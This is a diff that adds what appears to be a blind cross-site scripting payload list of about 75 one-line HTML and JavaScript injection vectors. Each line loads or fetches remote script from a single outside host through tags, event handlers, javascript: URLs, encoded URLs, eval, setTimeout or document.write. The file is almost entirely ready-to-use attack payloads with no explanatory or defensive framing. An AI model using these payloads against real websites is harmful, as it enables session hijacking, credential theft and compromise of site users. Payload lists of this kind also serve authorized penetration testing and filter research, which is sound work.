@@ -1,0 +1,77 @@
+<script src="https://b0a.vercel.app/"></script>
+<script src=https://b0a.vercel.app/></script>
+<script src=//b0a.vercel.app/></script>
+<script src=https://b0a.vercel.app defer></script>
+<script src=https://b0a.vercel.app async></script>
+<svg onload="var s=document.createElement('script');s.src='https://b0a.vercel.app/';document.body.appendChild(s)">
+<svg><script href=https://b0a.vercel.app/></script></svg>
+<svg><script xlink:href=https://b0a.vercel.app/></script></svg>
+<svg><animate onbegin="import('https://b0a.vercel.app/')"></svg>
+<img src=x onerror="this.src='https://b0a.vercel.app/'">
+<img src=1 onerror="var s=document.createElement('script');s.src='https://b0a.vercel.app/';document.body.appendChild(s)">
+<img src=x onerror="fetch('https://b0a.vercel.app/')">
+<iframe src="https://b0a.vercel.app/"></iframe>
+<iframe srcdoc="<script src=https://b0a.vercel.app/></script>"></iframe>
+<iframe src="javascript:var s=document.createElement('script');s.src='https://b0a.vercel.app/';document.body.appendChild(s)">
+<iframe src="data:text/html,<script src=https://b0a.vercel.app/></script>">
+<object data="data:text/html,<script src=https://b0a.vercel.app/></script>">
+<embed src="data:text/html,<script src=https://b0a.vercel.app/></script>">
+<details open ontoggle="import('https://b0a.vercel.app/')">
+<details open ontoggle="fetch('https://b0a.vercel.app/')">
+<input autofocus onfocus="import('https://b0a.vercel.app/')">
+<input onmouseover="fetch('https://b0a.vercel.app/')">
+<link rel=preload href="https://b0a.vercel.app/" as=script>
+<link rel=import href="https://b0a.vercel.app/">
+<style>@import url("https://b0a.vercel.app/");</style>
+<object data="https://b0a.vercel.app/"></object>
+<embed src="https://b0a.vercel.app/">
+<video src=x onerror="import('https://b0a.vercel.app/')">
+<audio src=x onerror="fetch('https://b0a.vercel.app/')">
+<math><mi xlink:href="https://b0a.vercel.app/">X</mi></math>
+<marquee onstart="import('https://b0a.vercel.app/')">
+<template><script src=https://b0a.vercel.app/></script></template>
+<a href="javascript:import('https://b0a.vercel.app/')">click</a>
+<form action="javascript:import('https://b0a.vercel.app/')">
+<script src=https://b0a.vercel.app%2f></script>
+<script src=&#104;&#116;&#116;&#112;&#115;://b0a.vercel.app/></script>
+<img src=x onerror="eval('import(`https://b0a.vercel.app/`)')">
+<div onpointerover="import('https://b0a.vercel.app/')">
+<div onwheel="fetch('https://b0a.vercel.app/')">
+<div onanimationstart="import('https://b0a.vercel.app/')">
+<iframe srcdoc="<svg onload=import('https://b0a.vercel.app/')>"></iframe>
+<img src=x onerror="this.onerror=null;this.src='data:text/html,<script src=https://b0a.vercel.app/></script>'">
+<svg><script>fetch('https://b0a.vercel.app/')</script></svg>
+<base href="https://b0a.vercel.app/">
+<base target="_blank" onfocus="import('https://b0a.vercel.app/')">
+<noscript><img src=x onerror="import('https://b0a.vercel.app/')"></noscript>
+<isindex type=image src=1 onerror="import('https://b0a.vercel.app/')">
+<keygen autofocus onfocus="import('https://b0a.vercel.app/')">
+<menuitem onclick="import('https://b0a.vercel.app/')">
+<dialog open onclose="import('https://b0a.vercel.app/')">
+<slot onslotchange="import('https://b0a.vercel.app/')"></slot>
+<portal src="https://b0a.vercel.app/"></portal>
+<fencedframe src="https://b0a.vercel.app/"></fencedframe>
+<picture><source srcset=x onerror="import('https://b0a.vercel.app/')"></picture>
+<video><track src=x onerror="import('https://b0a.vercel.app/')"></video>
+<output onmouseover="import('https://b0a.vercel.app/')">
+<meter onmouseover="import('https://b0a.vercel.app/')">
+<progress onmouseover="import('https://b0a.vercel.app/')">
+<bgsound src="https://b0a.vercel.app/">
+<xml onreadystatechange="import('https://b0a.vercel.app/')">
+<xmp><script src="https://b0a.vercel.app/"></script></xmp>
+<plaintext><script src="https://b0a.vercel.app/"></script>
+<div onbeforeinput="import('https://b0a.vercel.app/')">
+<div onformdata="import('https://b0a.vercel.app/')">
+<div onpointerrawupdate="import('https://b0a.vercel.app/')">
+<div onbeforematch="import('https://b0a.vercel.app/')">
+<div onsecuritypolicyviolation="import('https://b0a.vercel.app/')">
+import('https://b0a.vercel.app/')
+new Function("import('https://b0a.vercel.app/')")()
+setTimeout("import('https://b0a.vercel.app/')",0)
+location='javascript:import("https://b0a.vercel.app/")'
+document.write('<script src=https://b0a.vercel.app/><\/script>')
+<div style="x:expression(import('https://b0a.vercel.app/'))">
+<body background="javascript:import('https://b0a.vercel.app/')">
+<table background="javascript:import('https://b0a.vercel.app/')">
+
+
